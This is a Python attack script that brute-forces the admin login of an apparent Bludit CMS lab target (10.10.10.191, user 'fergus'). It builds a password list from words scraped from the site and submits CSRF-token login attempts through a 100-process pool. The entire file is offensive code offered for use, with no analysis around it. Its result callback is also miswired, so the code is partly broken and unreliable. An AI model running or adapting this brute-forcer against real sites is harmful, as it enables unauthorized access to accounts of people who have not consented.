#!/usr/bin/env python3
import re
import requests
from multiprocessing import Pool

def request_csrf_token(session, url):
    page = session.get(url)
    match = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', page.text)
    if match:
        return match.group(1)

class Blunder:
    def __init__(self, url, username):
        self.url = url
        self.username = username
        self.session = requests.Session()
    
    @property
    def words(self):
        page = self.session.get(self.url)
        content = page.content.decode('utf-8')
        reg = re.compile(r'\w+')
        return list({word for word in reg.findall(content)})
    
    def attempt_login(self, password):
        login_url = "%s/admin/login" % self.url 
        token = request_csrf_token(self.session, login_url)
        headers = {}
        data = {
            'tokenCSRF': token,
            'username': self.username,
            'password': password,
            'save': ''
        }
        resp = self.session.post(login_url, headers=headers, data=data, allow_redirects=False)
        return resp, password

    def run(self):
        pool = Pool(100)
        def callback(resp, password):
            if 'location' in resp.headers:
                if '/admin/dashboard' in resp.headers['location']:
                    print('SUCCESS: Password found!')
                    pool.terminate()
                    return password
        for word in self.words:
            pool.apply_async(self.attempt_login, args=[word], callback=callback)

        pool.close()
        pool.join()


def main():
    url = "http://10.10.10.191"
    username = "fergus"
    blunder = Blunder(url, username)
    blunder.run()

if __name__ == "__main__":
    main()
